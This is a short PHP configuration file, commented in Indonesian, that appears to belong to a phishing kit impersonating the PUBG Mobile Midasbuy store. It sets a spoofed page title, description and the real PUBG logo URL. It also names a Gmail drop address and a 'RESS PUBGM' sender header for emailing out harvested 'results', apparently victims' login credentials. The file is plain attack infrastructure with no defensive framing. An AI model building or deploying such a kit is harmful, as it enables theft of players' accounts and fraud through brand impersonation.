<?php
// KONTROL UNTUK MENDAPATKAN ZONA WAKTU (JAKARTA)
date_default_timezone_set('Asia/Jakarta');
$jamasuk = date('l, d-m-Y h:i:s');
$mailserver = "Kotakalatnew@gmail.com";
//KONTROL UNTUK DESKRIPSI HALAMAN
$title = 'PUBG Mobile - Midasbuy';
$description = 'PUBG Mobile - Midasbuy';
$copyright = 'PUBG Mobile - Midasbuy';
$theme = '#000';
$image = 'https://i.ibb.co/y4BNtrv/season.png';
$icon = 'https://www.pubgmobile.com/common/images/icon_logo.jpg';

// KONTROL UNTUK HALAMAN KIRIM RESULT
$sender = 'From: RESS PUBGM <resultmu@resultku>';
?>